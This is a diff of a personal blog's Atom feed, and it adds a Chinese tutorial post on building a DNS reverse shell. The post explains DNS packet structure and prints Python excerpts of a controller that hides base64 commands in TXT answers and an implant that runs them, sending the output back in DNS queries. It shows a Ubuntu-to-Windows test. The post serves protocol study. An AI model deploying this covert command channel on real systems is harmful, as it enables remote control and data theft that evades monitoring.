@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://phantom0301.github.io/"/>
-  <updated>2016-08-08T13:32:18.906Z</updated>
+  <updated>2016-08-13T04:25:23.896Z</updated>
   <id>http://phantom0301.github.io/</id>
   
   <author>
@@ -14,6 +14,132 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>也说DNS反弹Shell</title>
+    <link href="http://phantom0301.github.io/2016/08/11/DNSshell/"/>
+    <id>http://phantom0301.github.io/2016/08/11/DNSshell/</id>
+    <published>2016-08-11T12:03:39.000Z</published>
+    <updated>2016-08-13T04:25:23.896Z</updated>
+    
+    <content type="html">&lt;p&gt;我们就是喜欢在正常的位置放进去一些奇怪的东西。&lt;/p&gt;
+&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;
+&lt;h2 id=&quot;0x01-引子&quot;&gt;&lt;a href=&quot;#0x01-引子&quot; class=&quot;headerlink&quot; title=&quot;0x01 引子&quot;&gt;&lt;/a&gt;0x01 引子&lt;/h2&gt;&lt;p&gt;反弹Shell广泛应用于远程控制下的权限维持，通过反转攻（客户端）和受（服务端）的角色，来实现条件限制，尤其是内网情况下的远程连接。&lt;/p&gt;
+&lt;p&gt;反弹Shell的工具和实现方法多种多样，只要能够让被控端通过网络发送数据到控制端，并且实现数据的解析即可完成控制过程。&lt;/p&gt;
+&lt;p&gt;最近在继续了解网络协议，于是突然想在DNS数据包中插入一些伪造的命令来实现解析，本来准备自己尝试写一个DNS服务器和DNS请求程序来实现反弹，不过刚动笔就看到了别人开源的程序，于是直接使用别人的程序来学习了。&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/ahhh/Reverse_DNS_Shell&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://github.com/ahhh/Reverse_DNS_Shell&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;为了运行测试更方便，去掉了程序中的加解密功能，额外的Python包只需要dns和dnslib&lt;/p&gt;
+&lt;h2 id=&quot;0x02-DNS&quot;&gt;&lt;a href=&quot;#0x02-DNS&quot; class=&quot;headerlink&quot; title=&quot;0x02 DNS&quot;&gt;&lt;/a&gt;0x02 DNS&lt;/h2&gt;&lt;p&gt;为了关联主机和IP地址对应关系而诞生的DNS本身，不需要我在这里赘述了。跳过域名构成、查询过程等可以轻松在网络查询到的内容，我们直接来看看DNS的包构成&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160811202642.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;在smtp那篇文章中，我们提过一层一层洋葱状的协议包裹，在这里，我们跳过以太、IP、UDP头，直接到DNS数据的部分。&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;标志着数据开始的是Tran ID段，所有的问答信息都需要一定的机制来保证对应，这部分应该就是对应机制中的一部分。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li&gt;紧接着的Flags，0x0100表明了一些查询属性。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li&gt;Queries中是我们所要查询的host，查询类型。作为A类型查询，得到的是host的IP，这里也是我们做手脚的地方，不过TXT类型可以插入一些附加的信息，更适合我们用来构造命令语句。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;服务器回应包如下：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160812100828.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;作为回应的Tran ID，它和查询包相同。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li&gt;Flags中标准回应标志位&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li&gt;重复显示的Queries&lt;/li&gt;
+&lt;/ul&gt;
+&lt;ul&gt;
+&lt;li&gt;回应的Answers信息。通过CNAME查取主机规范名，再通过规范名查取对应IP。&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;利用这种相互应答的特性，我们初步计划通过以下流程来实现我们的反弹Shell&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;被控端：  发送DNS请求——&amp;gt;  接收回应并解析执行命令  ——&amp;gt;   发送DNS请求
+              |                    /|\               |
+              |                     |                |
+              |                     |                |
+             \|/                    |               \|/
+控制端： 接收DNS请求并解析命令回显——发送添加了命令的回应——接收DNS并解析命令
+&lt;/code&gt;&lt;/pre&gt;&lt;h2 id=&quot;0x03-程序&quot;&gt;&lt;a href=&quot;#0x03-程序&quot; class=&quot;headerlink&quot; title=&quot;0x03 程序&quot;&gt;&lt;/a&gt;0x03 程序&lt;/h2&gt;&lt;p&gt;原始的程序可以在上面的github中找到，这里贴出我们去掉加解密的部分程序。&lt;/p&gt;
+&lt;p&gt;先说DNS服务器的部分&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;def spawnShell(answer, payload):
+  shellInput = raw_input(PROMPT)
+  if shellInput == &amp;apos;quit&amp;apos;: EXIT = 1 
+  if shellInput == &amp;apos;&amp;apos;: spawnShell(answer, payload) 
+  out = base64.b64encode(shellInput)
+  answer.add_answer(
+     *dnslib.RR.fromZone(&amp;apos;{}.com 60 TXT &amp;quot;{}&amp;quot;&amp;apos;.format(payload, out)))
+  return answer
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这一部分封装了对DNS的应答，payload里是被控端发来的查询信息，也就是上一次命令执行后的回显，而out是我们这一次的命令，封装成了TXT的应答包&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;def recievePayload(udps):
+  data, addr = udps.recvfrom(1024)
+  dnsD = dnslib.DNSRecord.parse(data)
+  payload = dnsD.questions[0].qname.label[0]
+  answer = dnsD.reply()
+  return addr, payload, answer
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这部分对于被控端的查询包进行解析，从中获取到地址和数据，对于数据，解析出其中的命令回显，并且初始化一个应答包。&lt;/p&gt;
+&lt;p&gt;主函数中使用socket监听相关端口，对于监听到的包按照预定流程进行处理。&lt;/p&gt;
+&lt;p&gt;再来看看被控端发送的部分&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;def start(host):
+  while 1:
+    a = startConnection(host)
+    cmd = parseCmd(a)
+    stdoutput = runCmd(cmd)
+    sendOutputToServer(stdoutput, host)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;首先是整个流程一览，从程序中可以很清晰的看到建立连接，解析命令，执行命令，发送回显的过程。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;def startConnection(host):
+  url = formURL(nextCommand)
+  request = dns.message.make_query(url, dns.rdatatype.TXT)
+  answers = dns.query.udp(request, host)
+  a = answers.to_text()
+  return a
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;构造的url，也就是命令回显，对于没有命令的，会返回nxt。利用回显构造查询语句。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;def parseCmd(a):
+def runCmd(cmd)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这两段程序对于收到的文本格式的命令进行解析和执行，没有太多的东西可以讲。只是注意格式的截取，并且考虑对Linux和Windows的命令之间转换。&lt;/p&gt;
+&lt;pre&gt;&lt;code&gt;def sendOutputToServer(output, host):
+  send =&amp;apos;&amp;apos;
+  output_end = len(output)
+  for chunk in output:
+    send += chunk
+    output_end -= 1
+    if len(send) == 58:
+      url = formURL(send)
+      dnsMakeQuery(url, host)
+      send =&amp;apos;&amp;apos;
+    if output_end == 0:
+      url = formURL(send)
+      dnsMakeQuery(url, host)
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这部分负责发送DNS查询，按照与服务器约定的格式构造包并且进行发送。&lt;/p&gt;
+&lt;h2 id=&quot;0x04-测试&quot;&gt;&lt;a href=&quot;#0x04-测试&quot; class=&quot;headerlink&quot; title=&quot;0x04 测试&quot;&gt;&lt;/a&gt;0x04 测试&lt;/h2&gt;&lt;p&gt;我们需要先执行服务器端程序，然后执行被控端程序。我的服务端程序在一台Ubuntu主机上，被控端在我的Win10机器上。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121502.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;如图，是在Ubuntu上对Win10执行ipconfig命令的显示。&lt;/p&gt;
+&lt;p&gt;我们再进行抓包分析：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121742.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;这是被控端第一次连接时发送的包，因为控制端还没有指令，第一次连接发送的是空包，其中Name的值bnh0就是我之前所说的NXT&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;http://7xr3oj.com1.z0.glb.clouddn.com/QQ%E6%88%AA%E5%9B%BE20160813121858.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
+&lt;p&gt;而第二个包就是控制端发送的指令，在TXT中发送的就是指令whoami的base64编码，&lt;/p&gt;
+&lt;p&gt;可以对比和我之前实际抓包的不同之处，对照可以看出我们在DNS包的哪些地方做过修改。&lt;/p&gt;
+&lt;h2 id=&quot;0x05-延伸&quot;&gt;&lt;a href=&quot;#0x05-延伸&quot; class=&quot;headerlink&quot; title=&quot;0x05 延伸&quot;&gt;&lt;/a&gt;0x05 延伸&lt;/h2&gt;&lt;p&gt;其实相关的DNS隧道技术原理应该差不多，都是在本来应该放DNS规定信息的地方放入了其他的东西，来达到一些意想不到的结果。&lt;/p&gt;
+&lt;p&gt;当然，RFC还有许多协议可以让我随意构造去做测试，下一步考虑写一个多协议支持的Fuzzing工具   ：）&lt;/p&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;我们就是喜欢在正常的位置放进去一些奇怪的东西。&lt;/p&gt;
+    
+    </summary>
+    
+      <category term="安全基础" scheme="http://phantom0301.github.io/categories/%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
+    
+    
+      <category term="DNS" scheme="http://phantom0301.github.io/tags/DNS/"/>
+    
+      <category term="协议分析" scheme="http://phantom0301.github.io/tags/%E5%8D%8F%E8%AE%AE%E5%88%86%E6%9E%90/"/>
+    
+  </entry>
   
   <entry>
     <title>Ubuntu服务器下Remastersys系统打包</title>
@@ -459,7 +585,7 @@ docker run -d 镜像名或id
 &lt;p&gt;先入门基本指令，我以我的wordpress为例：&lt;/p&gt;
 &lt;blockquote&gt;
 &lt;p&gt;FROM ubuntu:14.04&lt;/p&gt;
-&lt;p&gt;MAINTAINER xxxx &lt;a href=&quot;&amp;#x6d;&amp;#97;&amp;#105;&amp;#108;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#x78;&amp;#x78;&amp;#x78;&amp;#x78;&amp;#64;&amp;#x78;&amp;#x78;&amp;#x78;&amp;#120;&quot;&gt;&amp;#x78;&amp;#x78;&amp;#x78;&amp;#x78;&amp;#64;&amp;#x78;&amp;#x78;&amp;#x78;&amp;#120;&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;MAINTAINER xxxx &lt;a href=&quot;&amp;#x6d;&amp;#97;&amp;#x69;&amp;#108;&amp;#116;&amp;#x6f;&amp;#x3a;&amp;#120;&amp;#120;&amp;#120;&amp;#x78;&amp;#64;&amp;#x78;&amp;#120;&amp;#x78;&amp;#x78;&quot;&gt;&amp;#120;&amp;#120;&amp;#120;&amp;#x78;&amp;#64;&amp;#x78;&amp;#120;&amp;#x78;&amp;#x78;&lt;/a&gt;&lt;/p&gt;
 &lt;p&gt;ENV DEBIAN_FRONTEND noninteractive&lt;/p&gt;
 &lt;p&gt;RUN apt-get update&lt;/p&gt;
 &lt;p&gt;RUN apt-get -y upgrade&lt;/p&gt;
@@ -1561,31 +1687,6 @@ document = client.db.collection.find_one({&amp;apos;_id&amp;apos;: ObjectId(post
       <category term="pymongo" scheme="http://phantom0301.github.io/tags/pymongo/"/>
     
       <category term="python" scheme="http://phantom0301.github.io/tags/python/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>博客纪元，写在前面</title>
-    <link href="http://phantom0301.github.io/2016/02/19/Head/"/>
-    <id>http://phantom0301.github.io/2016/02/19/Head/</id>
-    <published>2016-02-19T08:51:02.000Z</published>
-    <updated>2016-08-04T07:58:39.276Z</updated>
-    
-    <content type="html">&lt;p&gt;其实很早之前就希望能够开通一个个人博客，在这里分享所见、所学，将头脑里零碎的知识和感悟整理成系统的结构。&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;br&gt;最初，是打算用wp搭建博客，然后再买个阿里云的服务器和独立域名。wp的博客年前就已经搭好了，但是谁知买服务器的时候，提示说大四不能享受学生优惠~啊摔&lt;/p&gt;
-&lt;p&gt;没办法，又折腾起github的个人页面来了，用的是hexo+github，折腾了一天，解决了各种奇葩的问题，终于能够勉强运行了。&lt;/p&gt;
-&lt;p&gt;先简单的从之前wp的博客上搬几篇文章过来填白，话说如果有前端牛想要帮我美化一下，尽管来联系我：）&lt;/p&gt;
-</content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;其实很早之前就希望能够开通一个个人博客，在这里分享所见、所学，将头脑里零碎的知识和感悟整理成系统的结构。&lt;br&gt;
-    
-    </summary>
-    
-      <category term="感悟" scheme="http://phantom0301.github.io/categories/%E6%84%9F%E6%82%9F/"/>
-    
-    
-      <category term="感悟" scheme="http://phantom0301.github.io/tags/%E6%84%9F%E6%82%9F/"/>
     
   </entry>
   
